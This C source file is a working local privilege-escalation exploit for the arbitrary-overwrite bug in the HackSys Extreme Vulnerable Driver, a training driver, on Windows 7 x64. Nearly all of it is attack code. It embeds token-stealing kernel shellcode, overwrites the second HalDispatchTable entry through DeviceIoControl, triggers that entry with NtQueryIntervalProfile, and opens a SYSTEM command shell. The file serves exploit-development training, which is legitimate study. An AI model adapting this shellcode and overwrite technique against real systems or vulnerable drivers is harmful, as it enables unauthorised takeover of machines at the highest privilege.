// Exploit    : HackSys Extreme Vulnerable Driver - Arbitrary Overwrite 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 7 Enterprise (x64) SP1

#include <windows.h>
#include <stdio.h>
#include "Header.h"

// https://raw.githubusercontent.com/tekwizz123/HEVD-Exploit-Solutions/master/HEVD-WriteWhatWhere-Exploit/WriteWhatWhere-Exploit/WriteWhatWhere-Exploit.cpp
/* FuzzySecurity describes how to get the IOCTL codes an alternative way with a script as follows:
	(0x00000022 << 16) | (0x00000000 << 14) | (FUNC_NUM_HERE << 2) | 0x00000003

	Allow me to explain.

	** 0x22 = FILE_DEVICE_UNKNOWN
	   Shifting left by 16 bits will set the device type field according to https://msdn.microsoft.com/en-us/library/ms902086.aspx
	   as this field is from bit 16 to 31

	** 0x00 for access field, aka the next field starting from byte 14, will equal FILE_ANY_ACCESS, as this
	   field is from bit 14 to bit 15.

	** Bits 2 to 13 are the function number hence the shift here.

	** Last bit is bit 1 which we set to 3 or METHOD_NEITHER

	** Lastly we OR as this will ensure we set each part of the final 32 bit value (OR 0 or our current value for each segment
	with 1 for the bits we want to set and we will get 1 for each bit we wish to set. Easy solution).
*/

int main()
{
	LPVOID lpvPayload;
	LPVOID lpSourceTargetAddress = NULL;
	LPCWSTR deviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL ioResult = FALSE;
	LPCSTR lpWriteTargetName = "HalDispatchTable";
	LPCSTR lpFuncName = "NtQueryIntervalProfile";
	FARPROC fpWriteTarget = NULL;
	LPVOID lpWriteTargetAddress = NULL;
	DWORD bytesReturned = 0;
	const DWORD iocontrolCode = 0x22200B;

	// Token stealing shellcode
	BYTE shellCode[] = {
		//0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,     // breakpoint
		//0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // nop cushion 
		0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; zero out rax
		0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,       // mov rax,QWORD PTR gs:[rax+0x188] ; move current thread (KTHREAD) into rax (KPCR + 0x180(KPRCB) + 0x8(KTHREAD))
		0x48, 0x8B, 0x40, 0x70,                               // mov rax,QWORD PTR [rax+0x70]     ; move current EPROCESS to rax (KTHREAD + 0x50(KAPC_STATE) + 0x20(EPROCESS))
		0x48, 0x89, 0xC1,                                     // mov rcx, rax                     ; make copy of the current process's EPROCESS
		0x49, 0x89, 0xCB,                                     // mov r11,rcx                      ; store RefCnt from token (EX_FAST_REF) structure
		0x49, 0x83, 0xE3, 0x07,                               // and r11,0x7
		0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00,             // mov rdx,0x4                      ; move SYSTEM PID to rdx
		0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,             // mov rax,QWORD PTR [rax+0x188]    ; fetch ActiveProcessLinks doubly-linked list (EPROCESS+0x188)
		0x48, 0x2D, 0x88, 0x01, 0x00, 0x00,                   // sub rax, 0x188                   ; loop thru the list processes and extract UniqueProcessId (EPROCESS+0x180)
		0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,             // cmp QWORD PTR [rax+0x180],rdx    ; until you find SYSTEM PID of 4
		0x75, 0xEA,                                           // jne $-0x14+(0x2)
		0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00,             // mov rdx,QWORD PTR [rax+0x208]    ; grab SYSTEM's process EPROCESS token
		0x48, 0x83, 0xE2, 0xF0,                               // and rdx, 0x0fffffffffffffff0
		0x4C, 0x09, 0xDA,                                     // or rdx,r11
		0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00,             // mov QWORD PTR [rcx+0x208],rdx    ; replace the current EPROCESS's token
		0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; simulate NTSTATUS SUCCESS! 
		//0x48, 0x83, 0xC4, 0x38,                               // add rsp, 0x38                    ; recover Kernel stuff
		0xC3,                                                 // ret
	};

	typedef NTSTATUS(NTAPI *_NtQueryIntervalProfile)(
		ULONG ProfileSource,
		PULONG Interval
		);

	// Create driver handle
	HANDLE hevdDriver = CreateFile(deviceName,               // lpFileName
		GENERIC_READ | GENERIC_WRITE,			 // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,		 // dwShareMode
		NULL,						 // lpSecurityAttributes
		OPEN_EXISTING,					 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,				 // dwFlagsAndAttributes
		NULL						 // hTemplateFile
	);

	if (hevdDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to grab device handle with error code: %u\n", GetLastError());
		return 1;
	}

	printf("[+] Driver handle is at: %p\n", hevdDriver);

	lpvPayload = VirtualAlloc(NULL,                         // lpAddress
		sizeof(shellCode),                              // dwSize
		MEM_COMMIT | MEM_RESERVE,                       // flAllocationType
		PAGE_EXECUTE_READWRITE                          // flProtect
	);

	if (!lpvPayload) {
		printf("[!] Failed to allocate memory with error code: %u\n", GetLastError());
		return 1;
	}

	printf("[+] Shellcode buffer has been allocated\n");

	memcpy(lpvPayload,                                      // Dst
		shellCode,                                      // Src
		sizeof(shellCode)                               // size of Src
	);

	printf("[+] Shellcode has been copied to buffer at: 0x%p\n", lpvPayload);

	fpWriteTarget = GetHalDispatchTable(lpWriteTargetName);
	if (fpWriteTarget == NULL)
	{
		wprintf(L"[!] Failed to retrieve HALDispatchTable memory address!\n");
		CloseHandle(hevdDriver);
		exit(1);
	}

	//0: kd> dq nt!HalDispatchTable L2
	//fffff803`203206a0  00000000`00000004 fffff803`20071098
	// offset 0x0 = version 4 (6.1 and higher), offset 0x8 	NTSTATUS (*HalQuerySystemInformation) (HAL_QUERY_INFORMATION_CLASS, ULONG, PVOID, ULONG *);
	// reference https://github.com/Cn33liz/HSEVD-ArbitraryOverwrite/blob/master/HS-ArbitraryOverwrite/HS-ArbitraryOverwrite.c
	lpWriteTargetAddress = (LPVOID)((ULONG_PTR)fpWriteTarget + 0x8);
	wprintf(L"[+] %hs Address is at: 0x%p \n", lpWriteTargetName, (LPVOID)fpWriteTarget);
	wprintf(L"[+] Target address (second entry of HALDispatchTable) in Kernel space is at: 0x%p \n", lpWriteTargetAddress);

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == NULL) {
		printf("[!] Failed to GetProcAddress for NtQueryIntervalProfile with error code: %u\n", GetLastError());
		return NULL;
	}
	printf("[+] Successfully grabbed handle for NtQueryIntervalProfile\n");

	// reference https://github.com/tekwizz123/HEVD-Exploit-Solutions/blob/master/HEVD-WriteWhatWhere-Exploit/WriteWhatWhere-Exploit/WriteWhatWhere-Exploit.cpp
	printf("[+] Replacing target address with shellcode..\n");
	byte evilBuffer[16];
	LPVOID shellcodeAddress = &lpvPayload;
	memcpy(evilBuffer, &shellcodeAddress, 8);		// What  = token stealing shellcode 
	memcpy(evilBuffer + 8, &lpWriteTargetAddress, 8);	// Where = the second entry (pointer) of HAL Dispatch table  

	ioResult = DeviceIoControl(hevdDriver,                  // hDevice
		iocontrolCode,                                  // dwIoControlCode
		evilBuffer,					// lpInBuffer fp = *(fp-8)
		sizeof(evilBuffer),                             // nInBufferSize
		NULL,						// lpOutBuffer
		0,                                              // nOutBufferSize
		&bytesReturned,                                 // lpBytesReturned
		NULL                                            // lpOverlapped
	);
	
	if (ioResult == FALSE) {
		printf("[!] Failed to interact with Driver with error number: %u\n", GetLastError());
		return 1;
	}
	
	printf("[+] Successfully called HEVD driver with DeviceIoControl\n");

	// See below the reason we use the undocumented NtQueryIntervalProfile which ultimately calls KeQueryIntervalProfile
	//0: kd > uf nt!KeQueryIntervalProfile
	//nt!KeQueryIntervalProfile:
	//fffff800`02c52b70 4883ec38        sub     rsp, 38h
	//fffff800`02c52b74 85c9            test    ecx, ecx
	//fffff800`02c52b76 7508            jne     nt!KeQueryIntervalProfile + 0x10 (fffff800`02c52b80)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x8:
	//fffff800`02c52b78 8b050634e0ff    mov     eax, dword ptr[nt!KiProfileInterval(fffff800`02a55f84)]
	//fffff800`02c52b7e eb3c            jmp     nt!KeQueryIntervalProfile + 0x4c (fffff800`02c52bbc)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x10:
	//fffff800`02c52b80 83f901          cmp     ecx, 1
	//fffff800`02c52b83 7508            jne     nt!KeQueryIntervalProfile + 0x1d (fffff800`02c52b8d)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x15:
	//fffff800`02c52b85 8b0525afe8ff    mov     eax, dword ptr[nt!KiProfileAlignmentFixupInterval(fffff800`02addab0)]
	//fffff800`02c52b8b eb2f            jmp     nt!KeQueryIntervalProfile + 0x4c (fffff800`02c52bbc)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x1d:
	//fffff800`02c52b8d ba0c000000      mov     edx, 0Ch
	//fffff800`02c52b92 894c2420        mov     dword ptr[rsp + 20h], ecx
	//fffff800`02c52b96 4c8d4c2440      lea     r9, [rsp + 40h]
	//fffff800`02c52b9b 8d4af5          lea     ecx, [rdx - 0Bh]
	//fffff800`02c52b9e 4c8d442420      lea     r8, [rsp + 20h]
	//fffff800`02c52ba3 ff15bf40e0ff    call    qword ptr[nt!HalDispatchTable + 0x8 (fffff800`02a56c68)] <--- this is where the magic takes place! 
	//fffff800`02c52ba9 85c0            test    eax, eax
	//fffff800`02c52bab 780d            js      nt!KeQueryIntervalProfile + 0x4a (fffff800`02c52bba)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x3d:
	//fffff800`02c52bad 807c242400      cmp     byte ptr[rsp + 24h], 0
	//fffff800`02c52bb2 7406            je      nt!KeQueryIntervalProfile + 0x4a (fffff800`02c52bba)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x44:
	//fffff800`02c52bb4 8b442428        mov     eax, dword ptr[rsp + 28h]
	//fffff800`02c52bb8 eb02            jmp     nt!KeQueryIntervalProfile + 0x4c (fffff800`02c52bbc)  Branch
	//
	//nt!KeQueryIntervalProfile + 0x4a:
	//fffff800`02c52bba 33c0            xor     eax, eax <---- repliacte the following assembly for proper kernel recovery?
	//
	//nt!KeQueryIntervalProfile + 0x4c:
	//fffff800`02c52bbc 4883c438        add     rsp, 38h
	//fffff800`02c52bc0 c3              ret
	printf("[+] Calling NtQueryIntervalProfile to trigger the use of the second entry of HALDispatchTable\n");
	NtQueryIntervalProfile(0xdeadb33f, &bytesReturned);

	// spawn new cmd.exe as NT AUTHORITY\SYSTEM
	printf("[+] Enjoy your new SYSTEM shell!\n");
	system("cmd.exe");

	//cleanup code
	if (hevdDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(hevdDriver);
	}
	
	return 0;
}
